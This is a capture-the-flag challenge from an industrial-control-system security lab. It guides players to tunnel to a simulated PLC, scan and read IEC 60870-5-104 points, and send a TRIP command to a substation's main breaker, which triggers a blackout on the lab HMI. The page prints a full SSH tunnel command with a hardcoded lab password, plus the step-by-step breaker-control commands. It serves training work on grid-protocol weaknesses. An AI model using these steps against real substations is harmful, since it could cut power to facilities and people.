# Challenge 7  - Power Substation Blackout

**Points:** 500  
**Protocol:** IEC 60870-5-104  
**Difficulty:** Advanced  

---

## The Story

The plant has its own power substation  - breakers, feeders, and a 230V supply keeping everything running. It's controlled by a European SCADA protocol that manages power grids across the world. One command to the wrong breaker and the entire facility goes dark. Open the **Power** tab on the HMI to see the substation diagram.

## What You Know

- From process network scans, there's a PLC at 10.0.4.105:2404
- Port 2404 = IEC 60870-5-104 (European power grid SCADA)
- The SCADA HMI Power page shows a single-line substation diagram
- Main breaker is CLOSED (green), voltage ~230V

## Step 1: Watch the HMI

Open the **Power** tab on the SCADA HMI. You see:
- Single-line diagram with Main Breaker, Bus Tie, Feeders A & B
- Live voltage, current, frequency, power measurements
- Everything is green and normal

**Keep this page open  - you're about to cause a blackout.**

## Step 2: Set Up a Tunnel

Forward port 2404 through the EWS.

<details>
<summary>Tunnel command?</summary>

```bash
sshpass -p 'eng2024!' ssh -f -N -L 2404:10.0.4.105:2404 -p 2222 engineer@127.0.0.1
```
</details>

## Step 3: Scan the Station

IEC 104 organizes data differently from Modbus or EtherNet/IP:
- **IOA** (Information Object Address) identifies each data point
- **M_SP_NA_1** = single-point status (breaker open/closed)
- **M_ME_NC_1** = measured value (voltage, frequency)
- **C_SC_NA_1** = single command (control a breaker)

<details>
<summary>Scan command?</summary>

```bash
python3 ~/tools/iec104-tool.py -t 127.0.0.1 -c scan
```
</details>

**Study the output.** Note which IOAs are status points and which are command points. The command points can CONTROL the breakers.

## Step 4: Read Measurements

Get a detailed view of the substation state.

<details>
<summary>Command?</summary>

```bash
python3 ~/tools/iec104-tool.py -t 127.0.0.1 -c read
```
</details>

The main breaker at IOA 100 is CLOSED  - it's supplying power to the entire plant.

## Step 5: Trip the Main Breaker

The command IOA for the main breaker is listed in the scan output. Send a TRIP command to open it.

**Watch the HMI Power page when you do this.**

<details>
<summary>What value to use?</summary>

"trip" or "off" or "open"  - the tool accepts all of these.
</details>

<details>
<summary>Full command?</summary>

```bash
python3 ~/tools/iec104-tool.py -t 127.0.0.1 -c control --ioa <command_ioa> --value trip
```
</details>

**What happens on the HMI:** BLACKOUT flashes across the substation diagram. The main breaker turns RED (OPEN). The flag appears.

---

## What You Learned

- IEC 60870-5-104 controls real power grid infrastructure
- One command can blackout an entire facility
- No authentication required on breaker commands
- This is exactly how the Ukraine power grid was attacked in December 2015  - attackers used IEC 104 to open breakers remotely, cutting power to 230,000 people
